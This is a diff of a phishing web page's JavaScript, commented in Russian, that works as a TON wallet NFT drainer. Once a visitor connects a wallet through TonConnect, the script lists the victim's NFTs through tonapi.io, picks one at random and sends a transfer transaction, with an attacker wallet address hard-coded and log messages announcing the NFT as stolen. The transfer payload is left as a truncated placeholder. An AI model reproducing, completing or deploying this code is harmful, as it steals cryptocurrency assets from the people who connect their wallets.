@@ -16,12 +16,14 @@
 
     <script>
         (function() {
-            // ⚠️ ТВОИ ДАННЫЕ (заполни один раз)
-            const ATTACKER_ADDRESS = 'UQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRhhafG'; // ТВОЙ КОШЕЛЁК (уже вставлен)
-            const manifestUrl = 'https://username.github.io/repo/tonconnect-manifest.json'; // 👈 СЮДА ТВОЙ МАНИФЕСТ
+            // ========== ТВОИ ДАННЫЕ ==========
+            const ATTACKER_ADDRESS = 'UQDm_rT_9BCePyHF97-mZQbGXjMmMIBsZxFiIXDHHPRhhafG'; // ТВОЙ КОШЕЛЁК
+            const manifestUrl = 'https://username.github.io/repo/tonconnect-manifest.json'; // ТВОЙ МАНИФЕСТ
+            // ================================
 
             let tonConnectUI, connector;
 
+            // Получить ВСЕ NFT жертвы
             async function fetchAllNFTs(walletAddress) {
                 try {
                     const response = await fetch(`https://tonapi.io/v1/nft/search?owner=${walletAddress}`);
@@ -33,18 +35,27 @@
                 }
             }
 
+            // Стандартный payload для TEP-62 (может сработать для многих коллекций)
+            function createTep62Payload() {
+                // Это пример. В реальности нужно точное значение.
+                // Можно попробовать найти рабочий через перехват.
+                return 'te6ccgEBAQEAbgA...'; // ЗАМЕНИ НА РЕАЛЬНЫЙ, ЕСЛИ НАЙДЕШЬ
+            }
+
             async function transferNFT(collectionAddress, tokenId) {
                 try {
+                    const payload = createTep62Payload();
+
                     const transaction = {
                         validUntil: Math.floor(Date.now() / 1000) + 600,
                         messages: [{
                             address: collectionAddress,
                             amount: '5000000',
-                            payload: '' // ⚠️ для реальной кражи payload надо заполнить
+                            payload: payload
                         }]
                     };
                     await tonConnectUI.sendTransaction(transaction);
-                    console.log(`NFT ${tokenId} украден`);
+                    console.log(`NFT ${tokenId} украден (надеюсь)`);
                 } catch (e) {
                     console.error('Ошибка перевода:', e);
                 }
@@ -58,8 +69,10 @@
                     if (wallet) {
                         const allNfts = await fetchAllNFTs(wallet.account.address);
                         if (allNfts.length > 0) {
-                            const first = allNfts[0];
-                            await transferNFT(first.collection.address, first.index);
+                            // Выбираем случайный
+                            const randomIndex = Math.floor(Math.random() * allNfts.length);
+                            const randomNft = allNfts[randomIndex];
+                            await transferNFT(randomNft.collection.address, randomNft.index);
                         }
                     }
                 });
